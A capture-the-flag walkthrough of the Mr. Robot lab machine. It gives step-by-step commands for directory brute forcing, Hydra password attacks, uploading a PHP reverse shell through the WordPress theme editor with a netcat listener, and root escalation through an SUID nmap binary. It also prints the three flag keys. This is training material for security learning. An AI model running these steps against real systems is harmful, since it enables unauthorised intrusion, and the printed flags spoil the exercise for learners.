# **Mr. Robot CTF Walkthrough** 🏴‍☠️  
🎯 **Completed by: C1ph3r1337**  

## **1️⃣ Directory Bruteforcing (Gobuster)**  
🔹 **Key 1st**  

- Use `directories.txt` for brute-forcing:  
  ```bash
  gobuster dir -u http://<target-IP> -w /path/to/directories.txt
  ```
- Found `robots.txt` → `key-1-of-3.txt`  
- **Key 1:** `073403c8a58a1f80d943455fb30724b9`  

---

## **2️⃣ Cryptography (CyberChef)**  
- Found `../license` file → Scroll down to find a key.  
- Decode using **CyberChef**:  
  ```
  ZWxsaW90OkVSMjgtMDY1Mgo=
  ```
  ➡️ Decoded: **elliot:ER28-0652**  

---

## **3️⃣ Password Bruteforcing (Hydra) [Skipped]**  
🔹 Although I didn’t use Hydra, here’s how it works:  
```bash
hydra -l <username> -P <password-list> <target-IP> -t <threads> <protocol>
```
- `-l` → Single username  
- `-L` → List of usernames  
- `-p` → Single password  
- `-P` → List of passwords  
- `-t` → Threads (default 16)  
- `<protocol>` → Service (e.g., SSH, FTP)  

---

## **4️⃣ WordPress Login (Gobuster)**  
- **Found login page:** `../wp-login.php`  
- Used credentials:  
  ```
  Username: elliot  
  Password: ER28-0652  
  ```

---

## **5️⃣ Reverse Shell (PHP rev shell)**  
🔹 **Key 2nd**  

- Generate a **PHP reverse shell** from [www.revshells.com](https://www.revshells.com/) (PentestMonkey)  
- Modify the shell:  
  - Change `10.10.10.10` to **your tun0 IP**  
- Upload to **WordPress theme editor** and update.  
- Access shell via browser:  
  ```
  http://<target-IP>/xyz.php
  ```
- Start Netcat listener:  
  ```bash
  nc -lvnp <port>
  ```
- Spawn a stable shell:  
  ```bash
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  ```
- Extract password:  
  ```bash
  cd home/robot  
  cat password.raw-md5
  ```
  ```
  c3fcd3d76192e4007dfb496cca67e13b  → MD5 hash  
  ```
- Decrypt MD5 (`hash: abcdefghijklmnopqrstuvwxyz`)  
- Switch user:  
  ```bash
  su robot  
  Password: abcdefghijklmnopqrstuvwxyz  
  ```
- **Key 2:** `822c73956184f694993bede3eb39f959`  

---

## **6️⃣ Privilege Escalation (GTFOBins - Nmap Shell)**  
🔹 **Key 3rd**  

### **What is Privilege Escalation?**  
> Privilege escalation exploits vulnerabilities, design flaws, or misconfigurations to gain higher-level access within a system.

- **Check for restricted access:**  
  ```bash
  ls /root  
  ```
  **Permission denied**  

- **Find SUID binaries:**  
  ```bash
  find / -perm -6000 2>/dev/null | grep '/bin/'
  ```
  **Found:** `/usr/local/bin/nmap`  

- **Exploit using GTFOBins**  
  - Visit: [gtfobins.github.io](https://gtfobins.github.io)  
  - Run interactive Nmap shell:  
    ```bash
    nmap --interactive  
    !sh  
    ```
  - Verify root access:  
    ```bash
    whoami
    ```
  - Access final key:  
    ```bash
    cd /root  
    ls  
    cat key-3-of-3.txt  
    ```
  - **Key 3:** `04787ddef27c3dee1ee161b21670b4e4`  

**🔹 Completed by: C1ph3r1337** 🏆
